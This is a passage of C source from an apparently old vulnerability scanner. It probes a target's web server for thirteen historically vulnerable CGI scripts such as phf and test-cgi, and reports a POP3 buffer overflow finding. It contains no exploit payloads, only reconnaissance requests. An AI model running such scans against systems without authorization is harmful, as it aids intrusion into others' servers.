			fputs("POP3 server contains a buffer overflow that allows authenticated users to execute arbitrary.",result);
		}

		if(ver!="")
		rules(110,os_name,ver,result);
	skippop:
		close(s);
}

void cgiscript(char *scanhost)
{
 int sock;
 struct in_addr addr;
 struct sockaddr_in sin;
 struct hostent *he;
 unsigned long start;
 unsigned long end;
 unsigned long counter;
 char foundmsg[] = "200";
 char *cgistr;
 char buffer[1024];
 int count=0;
 int numin;
 char cgibuff[1024];
 char *buff[50];    /* Don't u think 50 is enought? */
 char *cginame[50]; /* Don't u think 50 is enought? */

 buff[1] = "GET /cgi-bin/phf HTTP/1.0\n\n";
 buff[2] = "GET /cgi-bin/Count.cgi HTTP/1.0\n\n";
 buff[3] = "GET /cgi-bin/test-cgi HTTP/1.0\n\n";
 buff[4] = "GET /cgi-bin/php.cgi HTTP/1.0\n\n";
 buff[5] = "GET /cgi-bin/handler HTTP/1.0\n\n";
 buff[6] = "GET /cgi-bin/webgais HTTP/1.0\n\n";
 buff[7] = "GET /cgi-bin/websendmail HTTP/1.0\n\n";
 buff[8] = "GET /cgi-bin/webdist.cgi HTTP/1.0\n\n";
 buff[9] = "GET /cgi-bin/faxsurvey HTTP/1.0\n\n";
 buff[10] = "GET /cgi-bin/htmlscript HTTP/1.0\n\n";
 buff[11] = "GET /cgi-bin/pfdispaly.cgi HTTP/1.0\n\n";
 buff[12] = "GET /cgi-bin/perl.exe HTTP/1.0\n\n";
 buff[13] = "GET /cgi-bin/wwwboard.pl HTTP/1.0\n\n";

 cginame[1] = "phf";
 cginame[2] = "Count.cgi";
 cginame[3] = "test-cgi";
 cginame[4] = "php.cgi";
 cginame[5] = "handler";
 cginame[6] = "webgais";
 cginame[7] = "websendmail";
 cginame[8] = "webdist.cgi";
 cginame[9] = "faxsurvey";
 cginame[10] = "htmlscript";
 cginame[11] = "pfdisplay";
 cginame[12] = "perl.exe";
 cginame[13] = "wwwboard.pl";
	puts("");
	puts("[Checking CGI Script....]");
	puts("");
	fprintf(result,"\n[Checking CGI Script....]\n");
  if ((he=gethostbyname(scanhost)) == NULL)
   {
   herror("gethostbyname");
   exit(0);
   }

 start=inet_addr(scanhost);
 counter=ntohl(start);

   sock=socket(AF_INET, SOCK_STREAM, 0);
   bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);
   sin.sin_family=AF_INET;
   sin.sin_port=htons(80);

  if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0)
     {
     //puts("\nNo WWW server found! skipping WWW checks...............\n");
	 goto skipwww;
     }
   send(sock, "HEAD / HTTP/1.0\n\n",17,0);
   recv(sock, buffer, sizeof(buffer),0);
   printf("%s",buffer);
   fprintf(result,"\n%s",buffer);
   close(sock); 
   
while(count++ < 13)   /* Change 13 to how many buff[?] u have above */
   {
   sock=socket(AF_INET, SOCK_STREAM, 0);
   bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);
   sin.sin_family=AF_INET;
   sin.sin_port=htons(80);
   if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0)
     {
     puts("\nNo WWW server found! skipping WWW checks...............\n");
	 fputs("\nNo WWW server found! skipping WWW checks...............\n",result);
	 break;
     }
   printf("Searching for %s : ",cginame[count]);
   fprintf(result,"Searching for %s : ",cginame[count]);
  
   for(numin=0;numin < 1024;numin++)
      {
      cgibuff[numin] = '\0';
      } 
  
   send(sock, buff[count],strlen(buff[count]),0);
   recv(sock, cgibuff, sizeof(cgibuff),0);
   cgistr = strstr(cgibuff,"not");//foundmsg);
   if( cgistr == NULL){
       printf("Found !! \n");
	   fprintf(result,"Found !! \n");
	   }
   else
   {
       printf("Not Found\n");
	   fprintf(result,"Not Found\n");
	}
 skipwww:
   close(sock);
   }
 }
